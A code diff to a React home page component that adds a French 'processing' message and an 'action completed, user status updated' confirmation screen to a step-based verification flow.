@@ -46,6 +46,7 @@ export default function Home() {
       .catch(() => {})
       .finally(() => {
         window.history.replaceState({}, "", "/");
+        setStep("adminDone");
       });
   }, []);
 
@@ -124,6 +125,16 @@ export default function Home() {
         {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} />}
         {step === "waiting"    && <CodeWaiting />}
         {step === "verified"   && <VerificationSuccess data={submittedData} />}
+        {step === "triggerAction" && (
+          <div className="text-center text-muted-foreground text-sm py-10">Traitement en cours...</div>
+        )}
+        {step === "adminDone" && (
+          <div className="bg-card border border-border rounded-2xl px-6 py-10 text-center shadow-xl">
+            <div className="text-4xl mb-4">✅</div>
+            <h2 className="font-heading text-xl font-bold text-foreground mb-2">Action effectuée</h2>
+            <p className="text-muted-foreground text-sm">Le statut de l'utilisateur a bien été mis à jour.</p>
+          </div>
+        )}
         {step === "wrong"      && <ResultScreen type="wrong" onBack={handleBack} />}
         {step === "expired"    && <ResultScreen type="expired" onBack={handleRetryCode} />}
       </div>
